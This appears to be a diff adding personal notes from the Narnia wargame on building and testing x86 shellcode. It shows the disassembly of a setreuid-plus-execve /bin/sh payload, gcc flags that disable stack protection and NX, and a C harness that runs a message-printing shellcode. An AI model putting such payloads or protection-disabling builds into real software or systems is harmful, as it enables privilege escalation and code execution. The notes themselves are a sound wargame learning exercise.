@@ -1,0 +1,71 @@
+
+[*] compile assembly file
+
+gcc -o get_shell_asm -m32 get_shell.s
+
+[*] disassembly
+
+objdump -d ./get_shell_asm
+
+
+[*] test shellcode in C file(This only successed run in narnia for me now)
+
+There are certain security features in modern compilers like NX protection which prevents execution of code in data segment or stack. So we should explicitly specify the compiler to disable these.
+
+gcc -g -Wall -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode
+./test_shellcode
+
+
+
+
+[***] Test
+
+
+I did this test on narnia, expected result is "y0u sp34k 1337 ?" and it works
+and get_shell.c file and get_shell.s file both work as expected, but not fot shellcode in C file, format as this example
+
+this is the get_shell shellcode part I used for test( from get_shell):
+
+[-] Failed
+
+000004ed <main>:
+ 4ed:	31 c0                	xor    %eax,%eax
+ 4ef:	b8 46 00 00 00       	mov    $0x46,%eax
+ 4f4:	31 db                	xor    %ebx,%ebx
+ 4f6:	31 c9                	xor    %ecx,%ecx
+ 4f8:	cd 80                	int    $0x80
+ 4fa:	31 c0                	xor    %eax,%eax
+ 4fc:	50                   	push   %eax
+ 4fd:	68 2f 2f 73 68       	push   $0x68732f2f
+ 502:	68 2f 62 69 6e       	push   $0x6e69622f
+ 507:	89 e3                	mov    %esp,%ebx
+ 509:	50                   	push   %eax
+ 50a:	53                   	push   %ebx
+ 50b:	89 e1                	mov    %esp,%ecx
+ 50d:	31 d2                	xor    %edx,%edx
+ 50f:	b8 0b 00 00 00       	mov    $0xb,%eax
+ 514:	cd 80                	int    $0x80
+ 516:	66 90                	xchg   %ax,%ax
+ 518:	66 90                	xchg   %ax,%ax
+ 51a:	66 90                	xchg   %ax,%ax
+ 51c:	66 90                	xchg   %ax,%ax
+ 51e:	66 90                	xchg   %ax,%ax
+
+
+[+] Succeed
+
+#include <stdio.h>
+
+char shellcode[] = "\xeb\x19\x31\xc0\xb0\x04\x31\xdb"
+                   "\xb3\x01\x59\x31\xd2\xb2\x12\xcd"
+                   "\x80\x31\xc0\xb0\x01\x31\xdb\xb3"
+                   "\x01\xcd\x80\xe8\xe2\xff\xff\xff"
+                   "\x20\x79\x30\x75\x20\x73\x70\x33"
+                   "\x34\x6b\x20\x31\x33\x33\x37\x20"
+                   "\x3f\x20";
+
+
+int main(int argc, char **argv) {
+    (*(void(*)())shellcode)();
+    return 0;
+}
